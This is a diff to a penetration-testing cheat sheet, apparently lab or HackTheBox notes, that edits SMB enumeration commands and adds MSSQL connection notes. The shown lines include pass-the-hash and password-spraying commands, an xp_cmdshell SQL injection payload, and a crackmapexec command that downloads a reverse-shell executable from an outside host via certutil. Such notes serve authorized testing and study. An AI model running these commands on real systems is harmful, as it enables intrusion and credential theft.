@@ -100,33 +100,35 @@
 
 4. Changing Shares: smbclient -L \\\\<IP>\\C$
 
-5. Username/password/Domain: smbclient -L \\\\<IP>\\C$ -U <Domain>/<username>%<password>
+5. Username/Domain/No Pass: smbclient \\\\$ip\\Public -U sequel/root
 
-6. $smbclient -L myhost -U DOMAIN/user -W workgroup
+6. Username/password/Domain: smbclient -L \\\\<IP>\\C$ -U <Domain>/<username>%<password>
 
-7. Lists file with permissions: smbmap -H <IP>
+7. $smbclient -L myhost -U DOMAIN/user -W workgroup
 
-8. Downloading: smbget -R smb://<IP>/anonymous
+8. Lists file with permissions: smbmap -H <IP>
 
-9. type prompt off, recurse on -> lets us download all the files using mget *
+9. Downloading: smbget -R smb://<IP>/anonymous
 
-10. Nmap Vuln Script: nmap --script "smb-vuln*" -p 139,445 <IP>
+10. type prompt off, recurse on -> lets us download all the files using mget *
 
-11. crackmapexec smb <IP>
+11. Nmap Vuln Script: nmap --script "smb-vuln*" -p 139,445 <IP>
 
-12. Users: crackmapexec smb <IP> --users
+12. crackmapexec smb <IP>
 
-13. Shares: crackmapexec smb <IP> --shares
+13. Users: crackmapexec smb <IP> --users
 
-14. Try Crackmapexec, psexec, smbexec, wmiexec
+14. Shares: crackmapexec smb <IP> --shares
 
-15.  smbclient //10.20.85.111/Users -U SKYLARK/k.smith --pw-nt-hash d2a87ca4d6735870dc2357a83960c379
+15. Try Crackmapexec, psexec, smbexec, wmiexec
 
-16. impacket-smbclient  -hashes 00000000000000000000000000000000:d2a87ca4d6735870dc2357a83960c379 skylark/k.smith@10.20.109.111
+16.  smbclient //10.20.85.111/Users -U SKYLARK/k.smith --pw-nt-hash d2a87ca4d6735870dc2357a83960c379
 
-17. crackmapexec smb 10.20.109.111 -u backup_service -p It4Server -x 'certutil -urlcache -split -f “http://192.168.45.188:8000/110reverse.exe” C:\110reverse.exe'
+17. impacket-smbclient  -hashes 00000000000000000000000000000000:d2a87ca4d6735870dc2357a83960c379 skylark/k.smith@10.20.109.111
 
-18. crackmapexec smb $ip --shares -u usernames.txt -p passwords.txt --continue-on-success
+18. crackmapexec smb 10.20.109.111 -u backup_service -p It4Server -x 'certutil -urlcache -split -f “http://192.168.45.188:8000/110reverse.exe” C:\110reverse.exe'
+
+19. crackmapexec smb $ip --shares -u usernames.txt -p passwords.txt --continue-on-success
 
 ```
 
@@ -460,6 +462,20 @@ admin'EXEC+xp_cmdshell+'c%3a\\inetpub\\wwwroot\\test.exe%3b--
 
 ```
 
+```
+This is mostly just notes from a htb I thought was worth remembering:
+
+Add to /etc/hosts:
+10.129.24.37 dc.sequel.htb sequel.htb dc
+
+Connect with impacket:
+impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@dc.sequel.htb
+
+List of Databases:
+select name from master..sysdatabases;
+
+
+```
 #### xp_cmdshell -> RCE
 
 ```
@@ -632,3 +648,5 @@ done
 
 Or just use Spose
 [Spose](https://github.com/aancw/spose)
+
+
